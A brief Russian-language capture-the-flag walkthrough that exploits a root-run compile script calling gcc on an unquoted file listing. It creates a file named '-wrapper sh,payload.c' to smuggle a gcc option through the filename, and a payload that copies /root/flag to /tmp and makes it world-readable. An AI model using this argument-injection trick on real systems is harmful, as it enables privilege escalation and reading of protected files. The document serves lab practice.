находим скрипт /top/compile.sh
```
#!/bin/bash
 cd /home/user/src
  gcc $(ls -- *.c) -o /bin/hello
```
в директории /home/user/src создаем файл с помощью 
```
touch -- '-wrapper sh,payload.c'
```
в файл payload.c записывает нагрузку 
```
#!/bin/bash 

cp /root/flag /tmp
chmod 777 /tmp/flag
```
выдаем права на файл payload.c и забираем флаг из директории/tmp